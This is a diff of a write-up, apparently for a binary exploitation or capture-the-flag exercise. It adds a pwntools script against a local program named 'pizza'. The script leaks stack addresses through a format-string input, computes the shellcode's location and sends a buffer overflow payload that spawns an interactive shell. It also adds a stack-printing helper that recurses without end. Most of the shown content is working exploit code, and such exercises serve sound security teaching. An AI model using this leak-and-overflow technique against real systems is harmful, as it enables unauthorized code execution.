@@ -13,10 +13,34 @@ Then we can start to write a Python transcript from the sample in order to crash
 ## Script and Explanation
 
 ### Python Script
-```
+```python
 #!/usr/bin/env python3
-
 from pwn import *
+
+# Stack Printing
+def stackPrint(core, num = 20):
+    rsp = core.rsp
+    print("Stack")
+    x = num // 2
+    addresses = []
+    # calculation and storing of the first half of the memory addresses
+    for i in range(x, 0, -1):
+        tmp = rsp + 8 * i
+        addresses.append(tmp)
+
+    # Print first address
+    for addr in addresses:
+        print(f"{addr:x}\t{core.read(addr, 8)}")
+
+    # Print Stack Pointer
+    print(f"{rsp:x}\t{core.read(rsp, 8)} <<<<< RSP")
+
+    # Print second half
+    for i in range(x -1, 0, -1):
+        tmp = rsp -8 * i
+        print(f"{tmp:x}\t{core.read(tmp, 8)}")
+    
+    stackPrint(core, num=10)
 
 #context.log_level = 'error'
 
@@ -27,25 +51,36 @@ context(arch='amd64', os='linux', endian='little', word_size=64)
 
 #getname_address = elf.symbols["getname"]
 
-#shellcode = asm(shellcraft.amd64.linux.sh())
+shellcode = asm(shellcraft.amd64.linux.sh())
 
 #print(f"Shellcode: {shellcode.hex().upper()}")
 #print(len(shellcode))
-
-input1 = b"Cantinflas"
-
 victim = process("./pizza")
-#print(str(victim.recvline(), "latin-1"))
-#victim.recvline()
-#victim.sendline(b"10")
 
-#victim.sendline(payload)
-#victim.wait()
+input1 = b"%p %p %p %p %p %p %p %p %p"
+
+
+
+print(str(victim.recvline(), "latin-1"))
+victim.sendline(input1)
+
+var = str(victim.recvline(), "latin-1")
+print(var)
+
+# Substract offsetto the start of shellcode
+addr = int(var.split(" ")[7],16) -112
+
+input2 = shellcode + b"T"*88 + addr.to_bytes(8, 'little')
+var = str(victim.recvline(), "latin-1")
+victim.sendline(b"4")
+
+victim.sendline(input2)
+
 victim.interactive()
-#core = victim.corefile
-#rsp = core.rsp
-#rbp = core.rbp
-#rip = core.rip
+
+victim.wait()
+
+exit()
 ```
 
 ### Explanation and Screenshots
